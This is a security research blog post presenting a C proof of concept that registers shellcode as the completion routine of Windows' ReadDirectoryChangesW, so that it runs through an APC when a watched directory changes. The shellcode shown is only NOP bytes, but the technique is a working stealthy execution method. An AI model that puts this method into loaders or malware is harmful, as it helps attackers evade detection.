---
title: Executing Shellcode with ReadDirectoryChanges’s Hidden Callback
url: https://osandamalith.com/2025/09/25/executing-shellcode-with-readdirectorychangess-hidden-callback/
source: 🔐Blog of Osanda
date: 2025-09-26
fetch_date: 2025-10-02T20:42:37.310775
---

# Executing Shellcode with ReadDirectoryChanges’s Hidden Callback

[## 🔐Blog of Osanda

### Security Researching and Reverse Engineering](https://osandamalith.com/ "🔐Blog of Osanda")

[Skip to content](#content "Skip to content")

* [🏠 Home](https://osandamalith.com/)
* [🔒 My Advisories](https://osandamalith.com/my-exploits/)
* [💊 Cool Posts](https://osandamalith.com/cool-posts/)
  + [💉 SQLi](https://osandamalith.com/tag/mysql/)
  + [🕷 Web App Security](https://osandamalith.com/category/web-application-security/)
  + [🛠 Tools](https://osandamalith.com/category/tools/)
  + [☢ Exploits](https://osandamalith.com/category/exploits/)
  + [🔬 Reverse Engineering](https://osandamalith.com/category/reversing-2/)
  + [🧬 Malware Analysis](https://osandamalith.com/category/malware/)
* [☠ Shellcodes](https://osandamalith.com/shellcodes/)
* [☣ About](https://osandamalith.com/about/)

* [Osanda Malith Jayathissa](https://osandamalith.com/author/osandamalith/ "View all posts by Osanda Malith Jayathissa")
* [September 25, 2025](https://osandamalith.com/2025/09/25/executing-shellcode-with-readdirectorychangess-hidden-callback/ "10:04 pm")

# [Executing Shellcode with ReadDirectoryChanges’s Hidden Callback](https://osandamalith.com/2025/09/25/executing-shellcode-with-readdirectorychangess-hidden-callback/)

While digging into the `ReadDirectoryChanges` API, I noticed it supports an asynchronous callback via `LPOVERLAPPED_COMPLETION_ROUTINE`. Most people use this API to monitor file system changes, but what if we could hijack that callback to execute shellcode? This led me to develop a proof-of-concept (PoC) that turns a mundane filesystem monitoring function into a stealthy shellcode execution vector.

The API is documented as follows by Microsoft.

BOOL ReadDirectoryChangesW(
[in] HANDLE hDirectory,
[out] LPVOID lpBuffer,
[in] DWORD nBufferLength,
[in] BOOL bWatchSubtree,
[in] DWORD dwNotifyFilter,
[out, optional] LPDWORD lpBytesReturned,
[in, out, optional] LPOVERLAPPED lpOverlapped,
[in, optional] LPOVERLAPPED\_COMPLETION\_ROUTINE lpCompletionRoutine
);

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10 | BOOL ReadDirectoryChangesW(  [in]                HANDLE                          hDirectory,  [out]               LPVOID                          lpBuffer,  [in]                DWORD                           nBufferLength,  [in]                BOOL                            bWatchSubtree,  [in]                DWORD                           dwNotifyFilter,  [out, optional]     LPDWORD                         lpBytesReturned,  [in, out, optional] LPOVERLAPPED                    lpOverlapped,  [in, optional]      LPOVERLAPPED\_COMPLETION\_ROUTINE lpCompletionRoutine  ); |

In this PoC, the shellcode is embedded in the executable’s .text section and passed as the `lpCompletionRoutine` argument to `ReadDirectoryChanges`. When a file system event like creating/deleting/renaming a file in a given directory completes the asynchronous I/O operation, the Windows kernel queues a user-mode Asynchronous Procedure Call (APC) to the issuing thread. Since the main thread enters an alertable state via `SleepEx(100, TRUE)`, the kernel delivers the APC, which invokes the shellcode as the I/O completion routine. This executes the shellcode directly in the context of the program’s main thread.

#include <windows.h>
#include <stdio.h>
/\*
[\*] ReadDirectoryChanges Shellcode Execution PoC
[\*] Author: Osanda Malith Jayathissa - @OsandaMalith
[\*] www.osandamalith.com
[\*] Date: 25/09/2025
\*/
#pragma section(".text")
\_\_declspec(allocate(".text")) unsigned char shellcode[] = {
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};
int main() {
puts("[\*] ReadDirectoryChanges Shellcode Execution PoC");
puts("[\*] Author: Osanda Malith Jayathissa - @OsandaMalith");
puts("[\*] www.osandamalith.com\n");
LPCWSTR dirPath = L"C:\\Temp"; // Dir to monitor
HANDLE hDir = CreateFileW(
dirPath,
FILE\_LIST\_DIRECTORY,
FILE\_SHARE\_READ | FILE\_SHARE\_WRITE | FILE\_SHARE\_DELETE,
NULL,
OPEN\_EXISTING,
FILE\_FLAG\_BACKUP\_SEMANTICS | FILE\_FLAG\_OVERLAPPED,
NULL
);
if (hDir == INVALID\_HANDLE\_VALUE) {
printf("[-] Failed to open directory: %d\n", GetLastError());
return 1;
}
printf("[+] Monitoring directory: %ls\n", dirPath);
printf("[+] Shellcode at: 0x%p\n", shellcode);
BYTE buffer[1024];
OVERLAPPED overlapped = { 0 };
overlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
BOOL result = ReadDirectoryChangesW(
hDir,
buffer,
sizeof buffer,
TRUE,
FILE\_NOTIFY\_CHANGE\_FILE\_NAME | FILE\_NOTIFY\_CHANGE\_DIR\_NAME,
NULL,
&overlapped,
(LPOVERLAPPED\_COMPLETION\_ROUTINE)(PVOID)shellcode // Register shellcode as completion routine
);
if (!result) {
printf("[-] ReadDirectoryChanges failed: %d\n", GetLastError());
CloseHandle(overlapped.hEvent);
CloseHandle(hDir);
return 1;
}
printf("[+] Shellcode registered as completion routine!\n");
printf("\n[\*] To trigger shellcode:\n");
printf("[+] Create/delete/rename a file in: %ls\n", dirPath);
// Wait for events
while (TRUE) {
// SleepEx with alertable wait
DWORD waitResult = SleepEx(100, TRUE); // TRUE = alertable
if (waitResult == WAIT\_IO\_COMPLETION) {
printf("[!] Completion routine executed!\n");
}
}
CloseHandle(overlapped.hEvent);
CloseHandle(hDir);
return 0;
}

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47  48  49  50  51  52  53  54  55  56  57  58  59  60  61  62  63  64  65  66  67  68  69  70  71  72 | #include <windows.h>  #include <stdio.h>  /\*  [\*] ReadDirectoryChanges Shellcode Execution PoC  [\*] Author: Osanda Malith Jayathissa - @OsandaMalith  [\*] www.osandamalith.com  [\*] Date: 25/09/2025  \*/  #pragma section(".text")  \_\_declspec(allocate(".text")) unsigned char shellcode[] = {  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90  };    int main() {  puts("[\*] ReadDirectoryChanges Shellcode Execution PoC");  puts("[\*] Author: Osanda Malith Jayathissa - @OsandaMalith");  puts("[\*] www.osandamalith.com\n");    LPCWSTR dirPath = L"C:\\Temp"; // Dir to monitor  HANDLE hDir = CreateFileW(  dirPath,  FILE\_LIST\_DIRECTORY,  FILE\_SHARE\_READ | FILE\_SHARE\_WRITE | FILE\_SHARE\_DELETE,  NULL,  OPEN\_EXISTING,  FILE\_FLAG\_BACKUP\_SEMANTICS | FILE\_FLAG\_OVERLAPPED,  NULL  );  if (hDir == INVALID\_HANDLE\_VALUE) {  printf("[-] Failed to open directory: %d\n", GetLastError());  return 1;  }  printf("[+] Monitoring directory: %ls\n", dirPath);  printf("[+] Shellcode at: 0x%p\n", shellcode);    BYTE buffer[1024];  OVERLAPPED overlapped = { 0 };  overlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);    BOOL result = ReadDirectoryChangesW(  hDir,  buffer,  sizeof buffer,  TRUE,  FILE\_NOTIFY\_CHANGE\_FILE\_NAME | FILE\_NOTIFY\_CHANGE\_DIR\_NAME,  NULL,  &overlapped,  (LPOVERLAPPED\_COMPLETION\_ROUTINE)(PVOID)shellcode    // Register shellcode as completion routine  );  if (!result) {  printf("[-] ReadDirectoryChanges failed: %d\n", GetLastError());  CloseHandle(overlapped.hEvent);  CloseHandle(hDir);  return 1;  }  printf("[+] Shellcode registered as completion routine!\n");  printf("\n[\*] To trigger shellcode:\n");  printf("[+] Create/delete/rename a file in: %ls\n", dirPath);    // Wait for events  while (TRUE) {  // SleepEx with alertable wait  DWORD waitResult = SleepEx(100, TRUE);  // TRUE = alertable  if (waitResult == WAIT\_IO\_COMPLETION) {  printf("[!] Completion routine executed!\n");  }  }    CloseHandle(overlapped.hEvent);  CloseHandle(hDir);  return 0;  } |

<https://github.com/OsandaMalith/ReadDirectoryChanges/blob/main/ReadDirectoryChanges.c>

### Share this:

* [Tweet](https://twitter.com/share)

* [Click to share on WhatsApp (Opens in new window)
  WhatsApp](https://osandamalith.com/2025/09/25/executing-shellcode-with-readdirectorychangess-hidden-callback/?share=jetpack-whatsapp)
* [Click to share on Telegram (Opens in new window)
  Telegram](https://osandamalith.com/2025/09/25/executing-shellcode-with-readdirector...